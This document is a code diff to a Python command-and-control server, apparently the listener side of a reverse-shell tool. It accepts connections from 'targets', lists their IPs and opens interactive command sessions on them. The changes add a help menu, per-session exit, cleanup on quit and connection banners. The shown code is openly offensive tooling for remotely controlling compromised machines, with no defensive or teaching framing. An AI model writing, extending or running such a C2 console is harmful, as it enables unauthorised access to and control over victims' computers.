@@ -16,6 +16,22 @@ stop_threads = False
 count = 1
 
 
+def get_help():
+    return '''
+#########################################################################################
+Server by F4d0
+
+OPTIONS:
+
+    targets         --> shows connected targets
+    session #       --> enters in session number #
+    help            --> shows this help menu
+    quit            --> quit
+
+#########################################################################################
+'''
+
+
 def shell(_s, _target, _addr):
     def reliable_send(_target, _cmd):
         if type(_cmd) is bytes:
@@ -41,6 +57,11 @@ def shell(_s, _target, _addr):
             break
             # _target.close()
             # _s.close()
+        elif cmd == 'exit':
+            _target.close()
+            targets.remove(_target)
+            ips.remove(_addr)
+            break
         elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
             # reliable_send(_target, 'pwd') # if linux
             # reliable_send(_target, 'cd')  # if windows
@@ -83,6 +104,7 @@ def server():
     global s
     global ips
     global targets
+    global stop_threads
     while True:
         if stop_threads:
             break
@@ -91,9 +113,10 @@ def server():
             target, ip = s.accept()
             targets.append(target)
             ips.append(ip)
-            print("#### TARGET = " + str(targets[0]))
-            print("#### IPS = " + str(ips[0]))
-            print(str(targets[client]) + '----' + str(ips[client]) + ' CONNECTED')
+            print('\n###############################\n'
+                  + 'TARGET: ' + str(targets[client]) + '\n'
+                  + 'IP/PORT: ' + str(ips[client]) + ' CONNECTED'
+                  + '\n###############################\n')
             client += 1
         except:
             pass
@@ -103,6 +126,7 @@ def main():
     global s
     global ips
     global targets
+    global stop_threads
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST, PORT))
@@ -113,14 +137,21 @@ def main():
     while True:
         cmd = input('* Center: ')
         if cmd == 'quit':
-            break
-            os.exit(0)
+            for target in targets:
+                target.close()
+            stop_threads = True
+            s.close()
+            exit(0)
+        if cmd == 'help':
+            print(get_help())
         if cmd == 'targets':
             count = 0
-            print("ENTER IN TARGETS")
+            print('\n###############################\n'
+                  + 'TARGETS Available: \n')
             for ip in ips:
                 print('Session ' + str(count) + '. <---> ' + str(ip))
                 count += 1
+            print('\n###############################\n')
         # elif cmd[:7] == 'session' and len(cmd[8:]) > 1:
         elif cmd[:7] == 'session':
             try:
